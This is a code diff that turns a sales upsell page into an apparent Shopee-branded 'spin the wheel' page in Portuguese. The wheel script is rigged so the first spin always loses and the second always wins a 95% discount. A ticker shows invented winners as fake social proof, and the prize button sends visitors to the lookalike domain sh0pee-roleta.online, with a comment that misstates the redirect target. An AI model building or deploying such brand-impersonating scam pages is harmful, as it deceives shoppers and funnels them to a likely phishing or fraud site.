@@ -1,99 +1,193 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
+<!DOCTYPE html><html lang="pt-br"><head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Upsell 1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Shopee - Gire a Roleta!</title>
+  <link rel="icon" href="favicon.html">
+  <link rel="stylesheet" href="css/all.css" crossorigin="anonymous">
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <link rel="stylesheet" href="css/stylead8e.css">
   <style>
-    body {
-      margin: 0;
-      background-color: #000;
-      font-family: Arial, sans-serif;
-      color: #fff;
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.3); }
+      100% { transform: scale(1); }
     }
-
-    .headline {
-      background-color: red;
-      color: white;
-      text-align: center;
-      font-weight: bold;
-      text-transform: uppercase;
-      padding: 15px 10px;
-      font-size: 1.2rem;
-    }
-
-    .subheadline {
-      background-color: #000;
-      color: yellow;
-      text-align: center;
-      padding: 10px 15px;
-      font-size: 1rem;
-    }
-
-    .spacer {
-      height: 20px;
-    }
-
-    .watch-text {
-      text-align: center;
-      font-size: 0.9rem;
-      color: #ccc;
-      margin-bottom: 10px;
-    }
-
-    /* Responsivo */
-    @media (max-width: 600px) {
-      .headline {
-        font-size: 1rem;
-        padding: 12px 8px;
-      }
-
-      .subheadline {
-        font-size: 0.95rem;
-        padding: 8px 12px;
-      }
-
-      .watch-text {
-        font-size: 0.85rem;
-      }
+    .pulsating {
+      animation: pulse 1.5s infinite;
     }
   </style>
+  
+
+<!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-C0TT6H1N01"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-C0TT6H1N01');
+</script>
+
+
 </head>
 <body>
-
-  <div class="headline">
-    COMPRA NÃO CONCLUÍDA
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <div id="loading-screen" style="display: none;">
+    <div class="spinner-loading"></div>
   </div>
 
-  <div class="subheadline">
-    Assista o vídeo para saber como acessar corretamente sem sua compra ser cancelada e você perder seu dinheiro.
+  <div id="page-content">
+    <section>
+      <div class="cta">
+        <h1 id="cta-text">
+          Gire a <b>Roleta</b> para ganhar o seu <b>Mega Desconto</b>!
+        </h1>
+      </div>
+      <div class="roulette">
+        <img src="responda.html" id="roleta1">
+        <div id="roleta2">
+          <img src="images/roleta.png" class="spinner">
+        </div>
+        <img src="images/button-gire.png" id="roleta3" style="cursor: pointer;">
+      </div>
+      <div class="button-roulette">
+        <button id="button-cta" class="runSpin">GIRE PARA GANHAR</button>
+      </div>
+    </section>
   </div>
 
-  <div class="spacer"></div>
-
-  <div class="watch-text">
-    Toque e assista o vídeo abaixo.
+  <div id="people" class="people">
+    <img src="images/man6.jpg" id="people-img" alt="">
+    <p style="text-align: center" id="people-p">João acabou de ganhar <b>75% de desconto</b>!</p>
   </div>
 
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
-  
-  <!-- Vídeo VTurb -->
-  <div id="vid_68494f3727101d67f14baea0" style="position: relative; width: 100%; padding: 56.25% 0 0;">
-    <img id="thumb_68494f3727101d67f14baea0" src="https://images.converteai.net/80d0b89d-7901-4c62-bf15-807e2dab2483/players/68494f3727101d67f14baea0/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail">
-    <div id="backdrop_68494f3727101d67f14baea0" style="-webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%;"></div>
+  <!-- Pop-up tentar novamente -->
+  <div id="overlay" class="overlay"></div>
+  <div id="popup-try-again" class="popup">
+    <div class="popup-content">
+      <h2>Uma pena!</h2>
+      <img src="images/sweat.png">
+      <p>Você foi o grande selecionado e ganhou 
+        <b class="text-success pulsating" style="color: green!important; font-size: 22px;"> 01 </b> chance extra. Boa sorte!
+      </p>
+      <button id="try-again-button">Tentar Novamente</button>
+    </div>
   </div>
-  <script type="text/javascript" id="scr_68494f3727101d67f14baea0">
-    var s = document.createElement("script");
-    s.src = "https://scripts.converteai.net/80d0b89d-7901-4c62-bf15-807e2dab2483/players/68494f3727101d67f14baea0/player.js";
-    s.async = true;
-    document.head.appendChild(s);
+
+  <!-- Pop-up vencedor -->
+  <div id="popup" class="popup">
+    <div class="popup-content">
+      <h2>Parabéns!</h2>
+      <img src="images/star-struck.png">
+      <p>Você acaba de ganhar o <b class="text-success pulsating">Mega Desconto de 95%</b></p>
+      <button id="resgatar-premio">Resgatar seu Prêmio</button>
+    </div>
+    <audio id="confetti-audio" src="media/ml.mp3"></audio>
+    <audio id="roleta-audio" src="media/roleta.mp3"></audio>
+  </div>
+
+  <!-- SCRIPTS -->
+  <script src="js/jquery-3.0.0.slim.min.js"></script>
+  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script>
+  <script src="js/confetti.browser.min.js"></script>
+
+  <script>
+    let attempt = 0;
+
+    const animateSpin = () => {
+      const roleta2 = document.querySelector('#roleta2');
+      const roleta2Img = document.querySelector('#roleta2 img');
+      const buttonCta = document.getElementById('button-cta');
+      const confettiAudio = document.getElementById('confetti-audio');
+      const roletaAudio = document.getElementById('roleta-audio');
+
+      if (roleta2) {
+        roleta2Img.classList.remove('spinner');
+        buttonCta.style.display = 'none';
+        roletaAudio.currentTime = 0;
+        roletaAudio.play();
+
+        if (attempt === 0) {
+          roleta2.classList.add('wheel__spinner_animated_retry_then_win');
+
+          setTimeout(() => {
+            roletaAudio.pause();
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('popup-try-again').style.display = 'block';
+          }, 10000);
+        } else {
+          roleta2.classList.add('wheel__spinner_animated');
+
+          setTimeout(() => {
+            roletaAudio.pause();
+            confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } });
+            confettiAudio.play();
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+            buttonCta.classList.add('hide-me');
+          }, 10000);
+        }
+      }
+    };
+
+    const addSpinAnimation = (element) => {
+      element.addEventListener('click', () => {
+        animateSpin();
+        attempt++;
+      });
+    };
+
+    document.querySelectorAll('.runSpin').forEach(addSpinAnimation);
+
+    document.getElementById('roleta3').addEventListener('click', () => {
+      animateSpin();
+      attempt++;
+    });
+
+    document.getElementById('try-again-button').addEventListener('click', () => {
+      document.getElementById('overlay').style.display = 'none';
+      document.getElementById('popup-try-again').style.display = 'none';
+      document.querySelector('#roleta2').classList.remove('wheel__spinner_animated_retry_then_win');
+      document.getElementById('button-cta').style.display = 'block';
+    });
+
+    // Atualização das notificações de pessoas ganhando
+    (() => {
+      const descontos = [5, 25, 50, 75, 95];
+      const frases = [
+        { frase: `Pedro acabou de ganhar <b>50% de desconto</b>!`, imgSrc: 'https://i.postimg.cc/RhB8zCK5/24.jpg' },
+        { frase: `Ana acabou de ganhar <b>75% de desconto</b>!`, imgSrc: 'https://i.postimg.cc/prw31XTF/2.jpg' },
+        { frase: `Bruno acabou de ganhar <b>95% de desconto</b>!`, imgSrc: 'https://i.postimg.cc/2ynfYBgw/5.jpg' }
+      ];
+
+      setInterval(() => {
+        const rand = Math.floor(Math.random() * frases.length);
+        const { frase, imgSrc } = frases[rand];
+        document.getElementById('people-p').innerHTML = frase;
+        document.getElementById('people-img').src = imgSrc;
+        const contDiv = document.getElementById('people');
+        contDiv.classList.toggle('display-off');
+        contDiv.classList.remove('slide-animation');
+        setTimeout(() => {
+          contDiv.classList.toggle('display-off');
+          contDiv.classList.add('slide-animation');
+        }, 20);
+      }, 4000);
+    })();
+
+    // ✅ Redireciona o botão “Resgatar seu Prêmio” para o Facebook
+    document.getElementById('resgatar-premio').addEventListener('click', () => {
+      window.location.href = 'http://sh0pee-roleta.online/loja/';
+    });
+
+    window.addEventListener('load', function () {
+      document.getElementById('loading-screen').style.display = 'none';
+    });
   </script>
 
-</body>
-</html>
+  <script src="js/jstools.js"></script>
+
+
+
+</body></html>
